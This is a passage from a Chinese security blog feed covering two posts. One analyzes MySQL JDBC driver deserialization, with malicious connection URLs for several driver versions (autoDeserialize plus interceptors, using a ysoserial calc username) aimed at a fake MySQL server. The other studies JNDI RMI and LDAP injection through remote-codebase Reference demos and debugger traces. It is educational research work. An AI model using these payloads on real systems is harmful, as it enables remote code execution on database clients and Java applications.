&lt;p&gt;跟到&lt;code&gt;ConnectionImpl&lt;/code&gt;的内部里看一看，一开始的代码部分都是一些属性的加载，在这里没什么意义，先不分析、比较重要的是下面标的两处断点&lt;/p&gt;
&lt;p&gt;第一处是初始化我们所用的请求监听器
（这个拦截器的作用是在执行 SQL 语句之前，对 SQL 语句进行检查，以防止 SQL 注入。）&lt;/p&gt;
&lt;p&gt;而第二处的功能，在这里则是==建立一个数据库链接==，显然更重要一点。我们详细跟进一下第二处的&lt;code&gt;createNewIO&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505084119.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这段代码的作用是在连接数据库之前，检查是否需要重试连接。如果不需要重试连接，则只连接一次。如果需要重试连接，则使用带有重试的连接。&lt;code&gt;connectOneTryOnly(isForReconnect)&lt;/code&gt;是一个私有方法，它的作用是只连接一次，而不进行重试。根据调试，能够看出来具体的请求已经被委派给了&lt;code&gt;connectOneTryOnly&lt;/code&gt;，我们接着跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505085602.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;断点前的代码完成了数据库的链接，并为&lt;code&gt;自动提交&lt;/code&gt;、&lt;code&gt;隔离级别&lt;/code&gt;、&lt;code&gt;只读状态&lt;/code&gt;和&lt;code&gt;目录&lt;/code&gt;，&lt;code&gt;查询拦截器&lt;/code&gt;都设置了相应的属性值。断点处的&lt;code&gt;initialzePropsFromServer&lt;/code&gt;的作用则是从所连接的服务器那里获取数据，初始化其余属性，我们再跟进一下。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505090306.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;initialzePropsFromServer&lt;/code&gt;的代码如下，最关键的地方在&lt;code&gt;handleAutoCommitDefaults&lt;/code&gt;
&lt;code&gt;handleAutoCommitDefaults()&lt;/code&gt; 这个方法，它的作用是设置自动提交的默认值。在JDBC中，自动提交是指在执行SQL语句时，是否自动提交事务。如果设置为true，则每次执行SQL语句后都会自动提交事务；如果设置为false，则需要手动调用commit()方法来提交事务。该方法通常用于设置JDBC连接的默认值，以便在创建连接时自动设置自动提交的默认值。而断点前面的代码仍然是一系列的初始化，这里就不细谈了，跟进
&lt;code&gt;handleAutoCommitDefaults()&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505091243.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;经过一系列的判断，handleAutoCommitDefaults()这里是决定把AutoCommit设置为true。跟进断点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505091801.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到了执行sql语句的部分
execSQL的方法签名如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;execSQL(String sql, int maxRows, CancelQueryTask timeoutTask, Object[] args, boolean useMaxRows, ResultSetFactory resultSetFactory, String catalog, String currentSchema, boolean isBatch)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中，参数&lt;code&gt;sql&lt;/code&gt;表示要执行的SQL语句，&lt;code&gt;autoCommitFlag ? &quot;SET autocommit=1&quot; : &quot;SET autocommit=0&quot;&lt;/code&gt;是一个三目运算符，用于根据&lt;code&gt;autoCommitFlag&lt;/code&gt;的值选择要执行的SQL语句，如果&lt;code&gt;autoCommitFlag&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;，则执行&lt;code&gt;SET autocommit=1&lt;/code&gt;，否则执行&lt;code&gt;SET autocommit=0&lt;/code&gt;。主要逻辑都在下面，我们跟进去，看看sql的具体执行流程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505092542.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到了&lt;code&gt;((NativeProtocol) this.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata, this::getProfilerEventHandlerInstanceFunction, resultSetFactory);&lt;/code&gt; 这里。这段代码是用来向 MySQL 数据库发送查询语句的。它使用的是 NativeProtocol 类的 sendQueryString 方法。这个方法有很多参数，其中包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;callingQuery：表示调用 sendQueryString 方法的语句，可以是 null。&lt;/li&gt;
&lt;li&gt;query：表示要发送的查询语句。&lt;/li&gt;
&lt;li&gt;encoding：表示要使用的字符编码。&lt;/li&gt;
&lt;li&gt;maxRows：表示要返回的最大行数，可以是负数或 0。&lt;/li&gt;
&lt;li&gt;streamResults：表示是否要将结果流式传输。&lt;/li&gt;
&lt;li&gt;catalog：表示要使用的数据库目录，可以是 null。&lt;/li&gt;
&lt;li&gt;cachedMetadata：表示要使用的元数据缓存，可以是 null。&lt;/li&gt;
&lt;li&gt;getProfilerEventHandlerInstanceFunction：表示一个函数，用于获取分析器事件处理程序的实例。&lt;/li&gt;
&lt;li&gt;resultSetFactory：表示用于创建结果集的工厂。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个方法==最终返回一个结果集，这个结果集包含了查询的结果==。
（这里跟进两步，懂得都懂）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505093145.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505093527.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sendQueryPacket()&lt;/code&gt;部分代码部分意义如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.将statementExecutionDepth加1，表示当前语句的执行深度增加1，用于判断是否达到最大嵌套层数的限制。&lt;/li&gt;
&lt;li&gt;2.获取SQL语句的byte数组和旧的数据包位置，用于保存查询语句的信息。&lt;/li&gt;
&lt;li&gt;3.记录查询语句的开始时间。&lt;/li&gt;
&lt;li&gt;4.使用LazyString创建一个查询语句。&lt;/li&gt;
&lt;li&gt;5.如果存在查询拦截器，调用invokeQueryInterceptorsPre方法进行预处理，其中query参数是当前查询语句，callingQuery参数是调用当前查询的语句，false表示当前查询不是批处理的一部分。&lt;/li&gt;
&lt;li&gt;6.返回拦截器处理后的结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;拦截器部分比较关键，跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505093725.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;具体的预处理在&lt;code&gt;preprocess&lt;/code&gt;这里实现，我们跟进看下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505094214.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;连跟了好几下，发现了一开始见到过的老熟人&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505094340.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里的rs就是SHOW SESSION STATUS数据包的返回结果，已经被我们的evilmysql加载好了payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505101004.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Pasted%20image%2020230505101526.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;(以上链子为ServerStatusDiffInterceptor链   8.0.7-8.0.20   )&lt;/p&gt;
&lt;h3&gt;链子搜集&lt;/h3&gt;
&lt;h4&gt;5.1.0-5.1.10&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);  
String sql = &quot;select database()&quot;;  
PreparedStatement ps = conn.prepareStatement(sql);  
//执行查询操作，返回的是数据库结果集的数据表  
ResultSet resultSet = ps.executeQuery();  

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload如上&lt;/p&gt;
&lt;h4&gt;5.1.11-5.x.xx&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);  
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;6.x&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;detectCustomCollations链&lt;/h2&gt;
&lt;h4&gt;涉及工具&lt;/h4&gt;
&lt;p&gt;https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server&lt;/p&gt;
&lt;h4&gt;5.1.45-5.1.48&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;amp;autoDeserialize=true&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;5.1.29-5.1.40&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;amp;autoDeserialize=true&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;5.1.19-5.1.28&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;amp;user=yso_CommonsCollections4_calc&quot;;  
String username = &quot;yso_CommonsCollections4_calc&quot;;  
String password = &quot;&quot;;  
Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
conn = DriverManager.getConnection(url,username,password);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ps:到后面不大想分析了，学个利用算了&lt;/p&gt;
</content:encoded></item><item><title>关于JNDI注入那点事儿</title><link>https://f4miti0n.github.io/posts/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/jndi%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</guid><pubDate>Tue, 02 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;JNDI概述&lt;/h3&gt;
&lt;p&gt;JNDI(Java Naming and Directory Interface，Java命名和目录接口)是为Java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如RMI、CORBA、LDAP、DNS等。&lt;/p&gt;
&lt;p&gt;JNDI包括以下提供者&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LDAP&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;轻量级目录协议&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;RMI&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;远程对象注册表,具体内容可看RMI反序列化学习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;DNS&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;域名解析服务&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;CORBA的COS服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;JNDI与RMI&lt;/h3&gt;
&lt;p&gt;ps ：这个方法在jdk8u121后就被修复了，能碰到的话，评价是且用且珍惜&lt;/p&gt;
&lt;h4&gt;导入Demo&lt;/h4&gt;
&lt;p&gt;JndiRmiServer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIServer {  
    public static void main(String[] args) throws NamingException, RemoteException {  
        InitialContext initialContext = new InitialContext();  
        
        //HelloImpl hello = (HelloImpl) initialContext.lookup(&quot;rmi://127.0.0.1/Hello&quot;);  
        //hello.sayhello(&quot;xxxxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;JndiRmiClient&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIClient {  
    public static void main(String[] args) throws NamingException, RemoteException {  
        InitialContext initialContext = new InitialContext();  
        HelloImpl hello = (HelloImpl) initialContext.lookup(&quot;rmi://127.0.0.1:1099/Hello&quot;);  
        hello.sayhello(&quot;xxxxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的话，就是通过lookup这个函数去加载rmi远程注册表上的Hello对象，假如这里是可控的话，我们显然可以加载自设的恶意RMI服务，从而实现反序列化任意对象的目的，但这个并不是传统意义上的Jndi注入&lt;/p&gt;
&lt;h4&gt;传统Jndi注入&lt;/h4&gt;
&lt;p&gt;解释：将远程对象设置为引用对象，关于引用对象的概念有点类似于代理模式
(当调用引用对象的时候【这里体现客户端获取引用对象?/调用引用对象方法？】,会自动调用设定的factory类里的代码)
下面是们要用到的一些demo源码&lt;/p&gt;
&lt;h5&gt;&lt;code&gt;IRemote接口&lt;/code&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;import java.rmi.Remote;  
import java.rmi.RemoteException;   
public interface IRemote extends Remote{  
    public void sayhello(String words) throws RemoteException;  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h5&gt;&lt;code&gt;Main(RMI注册)&lt;/code&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;import org.example.HelloImpl;  
  
import java.rmi.NotBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class Main {  
    public static void main(String[] args) throws RemoteException, NotBoundException, InterruptedException {  
        Registry registry = LocateRegistry.createRegistry(1099); 
        // 创建本地主机上的远程对象注册表  
        HelloImpl hello = new HelloImpl(); 
        // 创建一个实现了Hello接口的远程对象  
        registry.rebind(&quot;Hello&quot;, hello); 
        // 将该远程对象绑定到名为&quot;Hello&quot;的条目上  
        while(true){  
            Thread.sleep(10);  
        }  
//        IRemote hellox = (IRemote) registry.lookup(&quot;Hello&quot;);  
//// 通过名称查找并返回对应的远程对象引用  
//        hello.sayhello(&quot;aaacccca&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h5&gt;&lt;code&gt;JndiRmiServer&lt;/code&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIServer {  
    public static void main(String[] args) throws NamingException, InterruptedException {  
        InitialContext initialContext = new InitialContext();  
        Reference reference = new Reference(&quot;TestRef&quot;, &quot;TestRef&quot;, &quot;http://localhost:8991/&quot;);  
        initialContext.rebind(&quot;rmi://127.0.0.1:1099/testref&quot;,reference);  
        while(true){  
            Thread.sleep(1);  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h5&gt;&lt;code&gt;TestRef&lt;/code&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;import java.io.IOException;  
  
public class TestRef{  
    public TestRef() throws IOException {  
        System.out.println(System.getProperty(&quot;user.dir&quot;));  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;客户端&lt;/p&gt;
&lt;h5&gt;&lt;code&gt;JndiRmiClient&lt;/code&gt;&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIClient {  
    public static void main(String[] args) throws NamingException, RemoteException {  
        InitialContext initialContext = new InitialContext();  
        IRemote hello = (IRemote) initialContext.lookup(&quot;rmi://localhost:1099/testref&quot;);  
        //hello.sayhello(&quot;xxxxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上例子本质上还是利用类加载机制来实现的RCE，仍然没有跳出我们之前的所学范围
而这里的具体利用，其实就是之前RMI反序列化部分学习过的codebase恶意类加载，没什么过多好说的&lt;/p&gt;
&lt;h4&gt;lookup跟踪调试&lt;/h4&gt;
&lt;p&gt;在客户端这里给lookup方法上个断点，跟进调试一下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427164137.png&quot; alt=&quot;&quot; /&gt;
首先进入了&lt;code&gt;InitialContext#lookup&lt;/code&gt;:
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427164433.png&quot; alt=&quot;&quot; /&gt;
继续跟进一下来到了&lt;code&gt;GenericURLContext&lt;/code&gt;
(这里是由前面的getURLOrDefaultInitCtx决定的,由于JNDI调用的是RMI服务,所以这里进的是GenericURLcontext类,对于不同的服务,进入的Context不同(具体详情可以自己跟进一下&lt;code&gt;getURLDefaultInitCtx&lt;/code&gt; ),接着跟进 &lt;code&gt;ctx.lookup&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427165222.png&quot; alt=&quot;&quot; /&gt;
定位到了&lt;code&gt;RegistryContext&lt;/code&gt; 这里,跟进断点处的lookup
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427165646.png&quot; alt=&quot;&quot; /&gt;
这里的话是调用了注册中心的lookup方法,是本次重载的最后一层了,好像在这个方法这里也有一个相关的利用点,先不做深究了,这里执行一下lookup
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427171303.png&quot; alt=&quot;&quot; /&gt;
可以看到从远程注册表那里取回了一个obj对象,但出乎意料的是对象的类型不是我们预料中的引用类型的对象,猜测上一层的lookup处进行了加密处理
(后来看了看别的博主，发现猜错了，是在服务端那里加的密)
(  ==想问一下wrapper类型的对象到底是什么,感觉好多地方能看到他==  )&lt;/p&gt;
&lt;p&gt;这里跟进一下服务端，这里就不解释这么详细了，到registry之前的内容做下省略
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427171913.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427172105.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427172202.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427172438.png&quot; alt=&quot;&quot; /&gt;
最后是跟到了RegistryContext这里,能够看到他最终是重载了注册中心的rebind方法
比较关键的地方是这个encodeObject,光看名字就知道和我们的reference对象加密有关
(这个时候能够看到右下角的obj还是个引用对象)
跟进 &lt;code&gt;encodeObject&lt;/code&gt; 方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427173116.png&quot; alt=&quot;&quot; /&gt;
能够看到这里是用NamingManager.getStateToBind对obj进行了一次处理,再根据obj处理后的类型,将obj给打包起来,加密问题大概就是这样的,接着回到客户端
（怕忘了，把当时的进度再贴一遍）
跟进一下解密用的decodeObject函数
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427173536.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;decodeObject这里调用了getObjectInstance函数，光是看名字就知道这位是重量级，得跟进
（顺便提一下，现在已经能看到obj被解析回引用类型了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427173953.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进结果如下，咳咳，原本一位是在第三个断点处返回的对象，但根本没进去，很麻，看了看别的师傅的博客，发现在factory.getObjectInstance就返回了，我们跟进一下getObjectFactory
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427175123.png&quot; alt=&quot;&quot; /&gt;
这里又是个关键点，他会根据我们所传入的factoryname（服务端的第二个参数）,尝试在本地实例化，如果没实例化成功，则通过codebase所记载的地址去加载factory对象
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427175702.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进一下最后的loadclass，发现了关键方法，newstance，通过这个方法拿到了我们的恶意类的类对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427180002.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;拿到类对象后是在这里进行newInstance的，步过一下就会RCE&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230427180907.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;JNDI与LDAP&lt;/h3&gt;
&lt;p&gt;ps : 在8u141以下的版本可复现，工程师当年仅仅修复了RMI和CORBA的问题,把这个给忘&lt;/p&gt;
&lt;h4&gt;复现Demo&lt;/h4&gt;
&lt;p&gt;JndiServer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIServer {  
    public static void main(String[] args) throws NamingException, InterruptedException {  
        InitialContext initialContext = new InitialContext();  
        Reference reference = new Reference(&quot;TestRef&quot;, &quot;TestRef&quot;, &quot;http://192.168.239.133:8000/&quot;);  
        initialContext.rebind(&quot;ldap://192.168.239.133:10389/cn=JndiLdap,dc=example,dc=com&quot;,reference);  
        while(true){  
            Thread.sleep(1);  
        }  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;JndiClient&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class JNDIRMIClient {  
    public static void main(String[] args) throws NamingException, RemoteException {  
        InitialContext initialContext = new InitialContext();         initialContext.lookup(&quot;ldap://192.168.239.133:10389/cn=JndiLdap,dc=example,dc=com&quot;);  
        //hello.sayhello(&quot;xxxxxx&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时此刻的ApacheDirectoryStudio内部详情
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428161109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;流程分析&lt;/h4&gt;
&lt;p&gt;老样子,在Client处下个断点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428161206.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;进去之后还是老样子,根据调用的协议一步一步找重载lookup,这里省略省略,大体流程和之前类似&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428161415.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428161450.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428161630.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428162517.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428162759.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里的c_lookup就已经是最后一层的lookup了，没必要跳了
仔细的分析一下里面的情况,查看了一下它的方法字段,发现多了一个obj的属性,估计这个就是我们从ldap服务上所夺取的对象,给他下个断点,后面重点关注一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428163631.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428163751.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在这个方法处,我们得到了我们的ref对象,这里是通过attrs解密获得的,在obj.java这里找到了我们
的decodeReference方法,最后在这个方法里返回了我们的引用对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428163950.png&quot; alt=&quot;&quot; /&gt;
回到LdapCtx这里继续分析,在下面这里通过DirectoryManager.getObjectInstance方法,获得工厂对象(这里就是我们的恶意类)
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/JNDI%E6%B3%A8%E5%85%A5%201/Pasted%20image%2020230428164219.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在这里获取引用对象所指向的工厂的类对象,跟进一下&lt;/p&gt;
